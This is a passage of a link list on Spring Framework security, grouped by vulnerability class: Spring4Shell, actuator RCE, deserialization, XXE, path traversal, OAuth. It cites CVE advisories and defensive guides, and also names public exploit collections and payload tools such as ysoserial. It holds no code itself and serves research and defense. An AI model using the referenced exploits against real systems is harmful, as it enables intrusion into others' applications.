- [CVE-2025-41253: Spring Cloud Gateway Environment Exposure](https://zeropath.com/blog/cve-2025-41253-spring-cloud-gateway-spel-exposure)

**Spring4Shell & Data Binding**:
- [BlackHat EU-22: Databinding2Shell - Novel Pathways to RCE](https://i.blackhat.com/EU-22/Wednesday-Briefings/EU-22-Mu-Databinding2Shell-Novel-Pathways-to-RCE-Web-Frameworks.pdf)
- [CVE-2022-22965: Spring Framework RCE via Data Binding on JDK 9+](https://spring.io/security/cve-2022-22965/)
- [Spring4Shell Explained | HackTheBox](https://www.hackthebox.com/blog/spring4shell-explained-cve-2022-22965)
- [Unit42: Spring4Shell Exploitation Analysis](https://unit42.paloaltonetworks.com/cve-2022-22965-springshell/)
- [Trend Micro: Spring4Shell Mirai Botnet Weaponization](https://www.trendmicro.com/en_us/research/22/d/cve-2022-22965-analyzing-the-exploitation-of-spring4shell-vulner.html)

**Authorization Bypass**:
- [CVE-2022-22978: Authorization Bypass in RegexRequestMatcher](https://spring.io/blog/2022/05/15/cve-2022-22978-authorization-bypass-in-regexrequestmatcher/)
- [INE: CVE-2022-22978 Analysis](https://ine.com/blog/cve-202222978-authorization-bypass-in-regexrequestmatcher)
- [CVE-2023-34034: Spring WebFlux Authentication Bypass](https://jfrog.com/blog/spring-webflux-cve-2023-34034-write-up-and-proof-of-concept/)
- [CVE-2024-38821: WebFlux Static Resource Authorization Bypass](https://spring.io/security/cve-2024-38821/)

**Actuator Exploitation**:
- [Spring Boot Actuator Misconfigurations | Wiz Blog](https://www.wiz.io/blog/spring-boot-actuator-misconfigurations)
- [Exploiting Spring Boot Actuators | Veracode](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
- [RCE via Actuators and H2 Database | Spaceraccoon](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/)
- [Spring Boot Actuator H2 RCE | Beagle Security](https://beaglesecurity.com/blog/vulnerability/spring-boot-h2-database-rce.html)
- [Spring Boot Actuator Exploit Tools | GitHub mpgn](https://github.com/mpgn/Spring-Boot-Actuator-Exploit)

**Mass Assignment & Data Binding**:
- [Mass Assignment - OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [CVE-2022-22968: Data Binding Rules Vulnerability](https://spring.io/blog/2022/04/13/spring-framework-data-binding-rules-vulnerability-cve-2022-22968/)
- [Mass Assignment | Application Security Cheat Sheet](https://0xn3va.gitbook.io/cheat-sheets/framework/spring/mass-assignment)
- [Spring Boot Auto-Binding TIL | Hoppi](https://h0pp1.github.io/posts/auto-binding/)

**Spring Data Vulnerabilities**:
- [CVE-2016-6652: Spring Data JPA SQL Injection](https://spring.io/security/cve-2016-6652/)
- [Spring SQL Injection Prevention | StackHawk](https://www.stackhawk.com/blog/sql-injection-prevention-spring/)
- [Spring Data MongoDB SpEL Injection | PortSwigger Daily Swig](https://portswigger.net/daily-swig/spring-data-mongodb-hit-by-another-critical-spel-injection-flaw)

**Jackson Deserialization**:
- [Jackson Polymorphic Deserialization CVE Criteria](https://github.com/FasterXML/jackson/wiki/Jackson-Polymorphic-Deserialization-CVE-Criteria)
- [On Jackson CVEs: Don't Panic | @cowtowncoder](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)
- [Jackson Deserialization Vulnerability | Snyk](https://snyk.io/blog/jackson-deserialization-vulnerability/)
- [CVE-2017-7525: Polymorphic Deserialization | GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/1723)

**XXE Vulnerabilities**:
- [CVE-2013-4152: Spring OXM XXE](https://spring.io/security/cve-2013-4152/)
- [CVE-2013-7315: Spring MVC XXE](https://spring.io/security/cve-2013-7315/)
- [CVE-2014-0225: Spring MVC DTD XXE](https://spring.io/security/cve-2014-0225/)
- [CVE-2019-3772: Spring Integration XXE](https://spring.io/security/cve-2019-3772/)
- [CVE-2019-3773: Spring Web Services XXE](https://www.sonatype.com/blog/cve-2019-3773-spring-web-services-xml-external-entity-injection-xxe)
- [XML External Entity Prevention - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

**Path Traversal**:
- [CVE-2024-38816: Path Traversal in Spring Framework](https://spring.io/security/cve-2024-38816/)
- [CVE-2024-38819: Path Traversal in Functional Frameworks](https://spring.io/security/cve-2024-38819/)
- [Spring Path Traversal Guide | StackHawk](https://www.stackhawk.com/blog/spring-path-traversal-guide-examples-and-prevention/)
- [Spring View Manipulation Vulnerability | Veracode](https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability/)

**OAuth2 & Authentication**:
- [Spring Security OAuth Open Redirect | Exploit-DB](https://www.exploit-db.com/exploits/47000)
- [OAuth 2.0 Vulnerabilities | Application Security Cheat Sheet](https://0xn3va.gitbook.io/cheat-sheets/web-application/oauth-2.0-vulnerabilities)
- [Attacking and Defending OAuth 2.0 | Praetorian](https://www.praetorian.com/blog/attacking-and-defending-oauth-2/)
- [PKCE in Spring Security | Auth0 Blog](https://auth0.com/blog/pkce-in-web-applications-with-spring-security/)

**DevTools Security**:
- [Spring Boot DevTools Insecure Deserialization | Medium](https://medium.com/@sherif_ninja/springboot-devtools-insecure-deserialization-analysis-exploit-2c4ac77c285a)
- [Spring Boot Misconfiguration: DevTools Enabled | Invicti](https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/spring-boot-misconfiguration-developer-tools-enabled-on-production)

**2025 CVE Updates**:
- [Spring Framework & Security Fixes for CVE-2025-41248/41249](https://spring.io/blog/2025/09/15/spring-framework-and-spring-security-fixes-for-CVE-2025-41249-and-CVE-2025-41248/)
- [Spring Framework 6.2.10 Release (CVE-2025-41242)](https://spring.io/blog/2025/08/14/spring-framework-6-2-10-release-fixes-cve-2025-41242/)
- [Spring Framework Vulnerabilities | CyberPress](https://cyberpress.org/spring-framework-vulnerabilities/)

**Vulnerability Databases**:
- [Spring Security Advisories](https://spring.io/security/)
- [CVE Details: Spring Framework](https://www.cvedetails.com/vulnerability-list/vendor_id-252/product_id-96553/Vmware-Spring-Framework.html)
- [NVD: Spring Framework CVEs](https://www.cve.org/CVERecord/SearchResults?query=Spring+Framework)
- [Snyk Vulnerability DB: Spring](https://security.snyk.io/)

**Comprehensive Exploit Collections**:
- [Spring Boot Vulnerability Exploit Collection | GitHub LandGrey](https://github.com/LandGrey/SpringBootVulExploit)
- [Spring Boot Vulnerability | GitHub pyn3rd](https://github.com/pyn3rd/Spring-Boot-Vulnerability)
- [ysoserial: Java Deserialization Payloads](https://github.com/frohoff/ysoserial)

### Practical Guides
- [Spring Security Method Security Annotations | CodingNomads](https://codingnomads.com/spring-method-security-annotations)
- [Introduction to Spring Method Security | Baeldung](https://www.baeldung.com/spring-security-method-security)
- [Spring Boot Actuator Security Guide | Centron](https://www.centron.de/en/tutorial/spring-boot-actuator-endpoints-guide/)
